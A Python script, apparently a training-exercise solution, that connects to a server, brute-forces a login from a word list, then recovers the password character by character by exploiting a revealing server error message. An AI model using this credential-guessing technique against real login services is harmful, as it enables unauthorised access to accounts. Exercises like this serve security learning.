import argparse
import json
import logging
import socket

from itertools import combinations_with_replacement, product
from string import ascii_lowercase, digits, ascii_uppercase

logging.basicConfig(filename='log_file.txt',
                    filemode='a',
                    format='%(message)s',
                    level='DEBUG')


def get_arguments() -> tuple:
    parser = argparse.ArgumentParser()
    parser.add_argument("hostname", type=str)
    parser.add_argument("port", type=int)
    args = parser.parse_args()

    return (args.hostname, args.port)


def guess_password():
    pool = ascii_lowercase + digits
    for size in range(1, 10):
        for comb in combinations_with_replacement(pool, size):
            yield ''.join(comb)


def cap_password():
    with open('../../data/passwords.txt') as f:
        passwords = f.readlines()
    for password in passwords:
        if password.strip().isdigit():
            yield password
            continue
        for comb in product(*[[ch.lower(), ch.upper()] for ch in password.strip()]):
            yield ''.join(comb)


def brute_force_login():
    with open('../../data/logins.txt') as f:
        logins = f.readlines()
        for login in logins:
            yield login.strip()


def atom_password(start_str):
    pool = ascii_lowercase + digits + ascii_uppercase
    for letter in pool:
        yield f'{start_str}{letter}'


def get_message(login, password):
    return json.dumps({'login': login, 'password': password})


def main():
    with (socket.socket() as client_socket):
        address = get_arguments()
        logging.info('Connection to %s %s', *address)
        client_socket.connect(address)

        # Step 1 Guessing login
        login_gen = brute_force_login()
        while True:
            login = next(login_gen)
            client_socket.send(get_message(login, '-').encode())
            message = json.loads(client_socket.recv(1024).decode())
            if message['result'] == 'Wrong password!':
                logging.debug('Login found %s', login)
                break

        t_pass = ''
        while True:
            # Step 2 Guessing letter in password
            atom_pass = atom_password(t_pass)
            while True:
                password = next(atom_pass)
                client_socket.send(get_message(login, password).encode())
                message = json.loads(client_socket.recv(1024).decode())
                # logging.debug(f'{password}:{message}')
                if message['result'] == 'Exception happened during login':
                    logging.debug('Letter found %s', password)
                    t_pass = password
                    break
                if message['result'] == 'Connection success!':
                    break
            if message['result'] == 'Connection success!':
                print(get_message(login, password))
                break


if __name__ == '__main__':
    main()
